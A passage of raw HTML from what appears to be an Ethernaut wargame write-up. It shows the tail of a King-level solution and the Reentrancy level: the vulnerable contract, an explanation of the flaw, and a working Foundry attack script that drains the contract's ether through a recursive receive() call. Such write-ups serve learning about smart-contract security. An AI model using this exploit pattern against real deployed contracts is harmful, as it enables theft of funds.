&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Current Prize : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;_prize)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;exploit{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;_prize}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Final King : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;king&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_king&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    King public king &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;King&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(king)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;KingSolve.s.sol:KingSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;10-reentrancy&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#10-reentrancy&quot; aria-label=&quot;Anchor link for: 10-reentrancy&quot;&gt;10 Reentrancy&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Reentrancy.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Reentrance {
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  using SafeMath for uint256&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) public balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;donate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _to&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_to] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;balances[_to]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _who&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint balance&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;balances[_who]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;_amount) {
&lt;&#x2F;span&gt;&lt;span&gt;      (bool result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;_amount}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(result) {
&lt;&#x2F;span&gt;&lt;span&gt;        _amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      }
&lt;&#x2F;span&gt;&lt;span&gt;      balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;_amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() external payable {}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Drain all the ether of the Reentrance contract&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;The &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function is vulnerable to &lt;code&gt;Reentrancy&lt;&#x2F;code&gt;, as it is updating the user balance after the external call.&lt;&#x2F;li&gt;
&lt;li&gt;One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.&lt;&#x2F;li&gt;
&lt;li&gt;So, we will donate some ether to the contract and then call withdraw from a contract.&lt;&#x2F;li&gt;
&lt;li&gt;The withdraw call send our ether back and invokes the fallback or receive function of our contract.&lt;&#x2F;li&gt;
&lt;li&gt;We can call the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function again from the fallback function to reenter again into &lt;code&gt;Reentrance&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;Still we can manage to pass require check as our balance wasn&#x27;t updated yet.&lt;&#x2F;li&gt;
&lt;li&gt;We need to check the balance of the &lt;code&gt;Reentrance&lt;&#x2F;code&gt; contract before reentering because when we call the withdraw again after the balance of &lt;code&gt;Reentrance&lt;&#x2F;code&gt; becomes zero will revert the entire transaction.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;ReentrancySolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Reentrance} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Reentrancy.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ReentrancySolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Reentrance public reentrance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Reentrance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Initial Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(reentrance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;exploit{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Final Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(reentrance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Reentrance public reentrance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Reentrance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        reentrance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;donate{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        reentrance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; I need my sepolia back
&lt;&#x2F;span&gt;&lt;span&gt;        msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() payable external{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(reentrance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether){
&lt;&#x2F;span&gt;&lt;span&gt;            reentrance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
